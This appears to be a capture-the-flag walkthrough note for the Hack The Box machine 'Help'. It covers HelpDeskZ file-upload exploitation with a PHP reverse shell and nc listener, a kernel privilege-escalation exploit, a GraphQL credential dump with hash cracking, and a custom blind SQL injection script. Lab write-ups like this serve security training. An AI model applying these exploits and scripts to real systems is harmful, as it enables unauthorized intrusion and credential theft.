### Nmap 

```
sudo nmap -sC -sV -oN nmap-help 10.10.10.121
```

![[Pasted image 20250426150359.png]]

Got default apache page on port 80 

![[Pasted image 20250426150500.png]]

Run #gobuster against this site 

```
gobuster -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o http-root-gobuster.log
```

Immediately find /support page 

![[Pasted image 20250426153019.png]]

Navigate here and see HelpDeskZ 

![[Pasted image 20250426153107.png]]

Use #searchsploit 

```
searchsploit helpdeskz
```

Got two exploits 

![[Pasted image 20250426153233.png]]

Determine our HelpDeskZ version

View Page Source > CTRL+F for 1.0 > NO RESULTS :( 

Search GitHub for HelpDeskZ to try to find source application. 

Got it. 

![[Pasted image 20250426153448.png]]

See that there is a README.md in the source.

Try to navigate to README.md in the web app which does exist and we can save the README

![[Pasted image 20250426153600.png]]

We got the version 1.0.2 from the README :) 

![[Pasted image 20250426153643.png]]

So this web app is vulnerable to arbitrary file upload. 

Can view the exploit script with searchsploit. 

```
searchsploit -x exploits/php/webapps/40300.py
```

![[Pasted image 20250426153915.png]]

Back to browser and submit a ticket 

![[Pasted image 20250426154056.png]]

And there's an attachments option. 

Upload Pentestmonkey's php-reverse-shell.php

```
cp /usr/share/laudanum/php/php-reverse-shell.php .
```

With Kali IP and port 

![[Pasted image 20250426154312.png]]

After upload we get file not allowed 

![[Pasted image 20250426154412.png]]

Author of exploit says that this gets uploaded anyways. 

Now bringing the exploit code to cwd 

```
searchsploit -m exploits/php/webapps/40300.py
```

![[Pasted image 20250426154550.png]]

Figure out the location of the uploads directory by uploading a legit ticket. 

![[Pasted image 20250426154806.png]]
- this doesn't tell us anything :/

Try to get the upload directory by poking through the GitHub. 

![[Pasted image 20250426155101.png]]

Looks like file path is `/uploads/tickets`

Now trying the exploit. 

```
python3 40300.py http://10.10.10.121/support/uploads/tickets php-reverse-shell.php
```

Set up nc listener 

```
nc -lvnp 9001
```

![[Pasted image 20250426155430.png]]

This exploit isn't going to work because of the time (which is time on local box and not the server time)

![[Pasted image 20250426155511.png]]

Find out the server time:

Capture the web page in Burp. 

Navigate to "Options" > Check "Intercept responses based on the following rules" under "Intercept Server Responses"

![[Pasted image 20250426155804.png]]

Forward the request and check out the Date within the header response

![[Pasted image 20250426155855.png]]
- Date and time on server: June 8, 2019 at 1:53 GMT

Check Date and time on Kali with `date`

![[Pasted image 20250426160040.png]]
- Date and time on Kali: June 7, 2019 at 9:59 EDT

The time zone and the minutes are off. 

Modify the exploit script to grab the server time instead of the current time. 

Comment this line out 

![[Pasted image 20250426160252.png]]

Figuring out the correct code: 

![[Pasted image 20250426160535.png]]

Got the right index

![[Pasted image 20250426160605.png]]

Add the time format as well. 

Final code:

Import time and calendar as well..

![[Pasted image 20250426161024.png]]

Also shorten time range to 30 sec

![[Pasted image 20250426161128.png]]

Execute exploit script 
![[Pasted image 20250426161259.png]]

Start nc listener.

Re-upload shell on web app

# Initial Access
## Arbitrary File Upload 

Got a shell!!

![[Pasted image 20250426161447.png]]

Spawn tty shell. 

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

```
export TERM=xterm
```

```
stty raw -echo 
```

Run `ls -la`

![[Pasted image 20250426161732.png]]

View bash history 

```
cat .bash_history
```

![[Pasted image 20250426161822.png]]

Looks like we got a password for root. 

Run `su -` with this password, but no luck.

Transfer LinEnum.sh to box using #pythonhttpserver 

![[Pasted image 20250426162009.png]]

Grab script with wget. 

Execute LinEnum.sh

# Privilege Escalation
## Kernel Exploit 

Notice:

Kernel is old. 
![[Pasted image 20250426162137.png]]

Google this kernel for priv esc

![[Pasted image 20250426162840.png]]

Need to check which Ubuntu version we have 

```
cat /etc/lsb-release
```

![[Pasted image 20250426162945.png]]

Copy and paste the exploit into initial access shell. 

Compile the exploit

```
gcc exploit.c -o exploit
```

Execute the exploit and got root shell. 

![[Pasted image 20250426163148.png]]

# Alternative Initial Access
## Node?

Navigate to web app over port 3000

![[Pasted image 20250426163519.png]]
- This is supposed to give the hint to navigate to /graphql

![[Pasted image 20250426163624.png]]

Google "pentest graphql" to find a query to use 

![[Pasted image 20250426163741.png]]

Paste this into the URL 

![[Pasted image 20250426163812.png]]

This dumps a bunch of stuff.

![[Pasted image 20250426163858.png]]

Decoding the query with Burp.

![[Pasted image 20250426163958.png]]

Use graphql schema within Burp request to get a username and password.

![[Pasted image 20250426203933.png]]

Response 

![[Pasted image 20250426203956.png]]
- got username and password hash 

Go to hashes.org because it's 32 characters and looks like md5 hash.

Used website to crack the hash.

![[Pasted image 20250426204236.png]]
password: `godhelpmeplz`

Now, we can login to HelpDeskZ with the username and password

![[Pasted image 20250426204329.png]]
- helpme@helpme[.]com : godhelpmeplz

```
searchsploit helpdeskz
```

Use the second exploit now 

![[Pasted image 20250426204600.png]]

View the exploit code:

![[Pasted image 20250426204646.png]]

![[Pasted image 20250426204719.png]]

Trying this within the URL

![[Pasted image 20250426204811.png]]

Catch request with Burp

![[Pasted image 20250426204905.png]]

Response is gibberish

![[Pasted image 20250426204950.png]]

Trying things within param statement to get something 

![[Pasted image 20250426205027.png]]
- gibberish
![[Pasted image 20250426205119.png]]
- nothing
![[Pasted image 20250426205137.png]]
- gibberish

![[Pasted image 20250426205219.png]]

Got 
![[Pasted image 20250426205244.png]]

Looks like boolean based SQLi.

Copy this request to a file called helpdesk.req

Run #sqlmap

```
sqlmap -r helpdesk.req --batch
```

![[Pasted image 20250426205451.png]]

Creating sql.py script to "manually" abuse these parameters

```
import requests

def blindInject(query):
	url = f"http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=7 {query}"
	cookies = {'PHPSESSID': 'esdkjshdfkjhksh', 'userhash': 'ssjglkhdhkfdhfhhdhGJFDSFAFshhk=='}
	response = requests.get(url, cookies=cookies)
	rContentType = response.headers["Content-Type"]
	if rContentType == 'image/png':
		return True
	else:
		return False

keyspace = 'abcdef0123456789' #hex characters
for i in range(0,40): #sha1 sum
	for c in keyspace:
		inject = f"and substr((select password from staff limit 0,1), {i}, 1) = '{c}'"
		if blindInject(inject):
			print(c, end = '', flush=True)

if blindInject("and 1=1"):
	print("WOOT")
```

![[Pasted image 20250426211147.png]]

Need to identify what to flag on:

![[Pasted image 20250426205810.png]]
- 200 OK
- Content-Length is 1110
- Content-Type is either **text/html** or image/png

We want to flag on Content-Type

Need to also grab the cookie from Burp 

![[Pasted image 20250426210610.png]]

Final script 

![[Pasted image 20250426212330.png]]

Result 

![[Pasted image 20250426212456.png]]

Crack this hash using that website again 

![[Pasted image 20250426212545.png]]
- password is `Welcome1`

Then can use the creds to ssh in as help user 

![[Pasted image 20250426212644.png]]

